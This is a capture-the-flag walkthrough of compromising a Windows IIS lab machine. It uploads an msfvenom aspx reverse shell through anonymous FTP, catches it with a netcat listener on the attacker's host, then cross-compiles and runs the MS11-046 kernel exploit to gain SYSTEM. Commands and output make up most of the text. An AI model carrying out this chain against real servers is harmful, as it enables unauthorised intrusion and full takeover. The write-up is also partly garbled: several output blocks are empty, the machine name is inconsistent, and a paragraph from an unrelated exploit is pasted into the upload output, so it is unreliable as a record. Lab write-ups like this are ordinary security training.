Walkthrough for Legacy: 10.10.10.5 - Old School webshell uploads and simple cross compiles!

## Enumeration

first we assign the ip addresses to a local variables:
 
``` bash
DEVEL=10.10.10.5
ATTACK=10.10.14.34
```
 
First we run the nmap scan (avoiding the ping) to identify the running services:
 
``` bash
nmap $DEVEL -Pn
```
 
We get an output:
 
```
Nmap scan report for 10.10.10.5
Host is up (0.043s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.35 seconds
```

First impressions are that this is a webserver, possibly with FTP enabled to upload the site from a remote location.

FTP is a universal service used to transfer files and HTTP is the standard websever protocol.
Botha are using standard ports.


Let's kick it up a notch and go into a targeted aggressive scan:
 
``` bash
sudo nmap $DEVEL -Pn -p 21,80 -A
```
gives us more verbose reading
 
```
Nmap scan report for 10.10.10.5
Host is up (0.048s latency).

Time for some triage.
 
 
## Triage
 
Looks like we have a Microsoft Windows server running an IIS 7 webserver with anonymous login on an FTP service.

First thing we'll check is a curl of the website:

``` bash
curl -Ik $DEVEL
```

We get the following:

```
HTTP/1.1 200 OK
Content-Length: 689
Content-Type: text/html
Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
Accept-Ranges: bytes
ETag: "37b5ed12c9fd21:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Thu, 08 Feb 2018 02:17:06 GMT

```

Pretty standard response, the most useful information is from ```X-Powered-By: ASP.NET``` header suggests an ASP site. At this point we could investigate the website, but because the FTP service as anonaymous login we'll poke around in it first.

Lets try login

``` bash
ftp $DEVEL
```

I provide the anonymous username and no password to login:

```
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:bhero): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
```

checking the directory listing with:

```
ls
```

gives a standard IIS response

```
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete
```

I wonder if we can upload files?

``` bash
mput test.txt
```

It appears to:

```
mput test.txt? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
6 bytes sent in 0.00 secs (82.5264 kB/s)
```

Checking the directory shows the file

```
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
10-10-19  05:39AM                    6 test.txt
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.

```

Interesting, can I read it via curl? I drop the FTP sessions and try with:

``` bash
curl -ik $DEVEL/test.txt
```

Yes I can!

```

By virtue the site is powered by ASP, I wonder if I can place executable code?

## Exploit

In order to get RCE, my plan is to upload an asp reverse shell then visit it in the browser to trigger the shell back to a listener on my attacking machine.

First we need to generate a non-staged reverse shell payload with msfvenom:

``` bash
msfvenom -p windows/shell_reverse_tcp -f aspx -o shell.aspx LHOST=$ATTACK LPORT=1337
```

this is works.

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2714 bytes
Saved as: shell.aspx
```

After re-logging in to FTP, I place the file with mput:

``` bash
mput shell.aspx
```

after confirming this works:

```
mput shell.aspx? y
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
2749 bytes sent in 0.00 secs (30.4843 MB/s)
When we attempt a re-write of a manual exploit we need to have a good idea that the exploit is compatible with our target and that there are no errors. Glancing through this it looks like the author has made consession for different OS versions and languages. As our nmap script is favoring XP it looks like option 1 is the good option on line 204:

``` 

I exit FTP and set up my listener:

``` bash
nc -nvlp 1337
```

And trigger in a different terminal with curl:

``` bash
curl -ik $DEVEL/shell.aspx
```

Back in my listener terminal I have a shell:

```
listening on [any] 1337 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.5] 49159
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```

Checking my permissions I see I have a low prive user:

``` cmd
whoami
iis apppool\web
```

## Priv Escalation

With low priv access we begin the information gathering process again in an effort to understand the OS configuration I start with:

``` cmd
systeminfo
```

This returns:

```

```

Immediately two lines give me hope:

```
OS Name:                   Microsoft Windows 7 Enterprise 
Hotfix(s):                 N/A
```

This OS is pre Service Pack 1 and has no Hotfixes applied, odds are if we can get the server architecture
we might be able to pop a kernel exploit.

While we can see its x86 from system info, a handy check in a pinch is with wmic:

``` cmd
wmic OS get OSArchitecture
```

this gives:

```
OSArchitecture  
32-bit
```

With this information I should be able to get a quick win with a kernel exploit, Fuzzy Security has a great starting point tutorial when kernel exploits fail: [Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)

At this stage I have enough information to start an attack. A go to for me is MS11-046, which relies on exploiting afd.sys a driver which manages Winsock TCP/IP networking. Classically networking sockets need to run elevated to interact with the Kernel and this driver is no exception. By virtue this OS is unpached I'm hopeful for a path to system.

Lets check searchsploit:

``` bash
searchsploit MS11-046
```

Shows 2 exploits:

```

18755, a DOS attack and 40564 a local priv escalation. Lets look at the priv esc:

``` bash
searchsploit 40564 -x
```

Scrolling through we get a better idea of the exploit:

```
################################################################
# Vulnerability description:
#   The Ancillary Function Driver (AFD) supports Windows sockets 
#   applications and is contained in the afd.sys file. The afd.sys
#   driver runs in kernel mode and manages the Winsock TCP/IP
#   communications protocol. 
#   An elevation of privilege vulnerability exists where the AFD
#   improperly validates input passed from user mode to the kernel.
#   An attacker must have valid logon credentials and be able to
#   log on locally to exploit the vulnerability.
#   An attacker who successfully exploited this vulnerability could
#   run arbitrary code in kernel mode (i.e. with NT AUTHORITY\SYSTEM
#   privileges).
################################################################
```

We'll copy 40564 to our local directory.

``` bash
searchsploit 40564 -m
```

And cross compile it using mingw-w64 for windows x86 architecture on our Kali:

```
i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
```

I connect back to Devel via FTP, set the transfer mode to binary and copy it to the target.

```

ftp> set binary

```

upload the file:

``` bash
mput MS11-046.exe
```

it works:

```
mput MS11-046.exe? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
```

back to our reverse shell terminal I look for the file: 

```cmd
dir MS11-046.exe /s /p
```

shows:

```

```

I go to c:\inetpub\wwwroot where the upload is and run it:

``` cmd
cd c:\inetpub\wwwroot
MS11-046.exe
```

this changes my directory:

```
c:\Windows\System32>
```

I check my privelege level with:

``` cmd
whoami
```

And I'm System! W00tW00t!

```
nt authority\system
```

Note on exit of the shell we see the stout of the exploit:
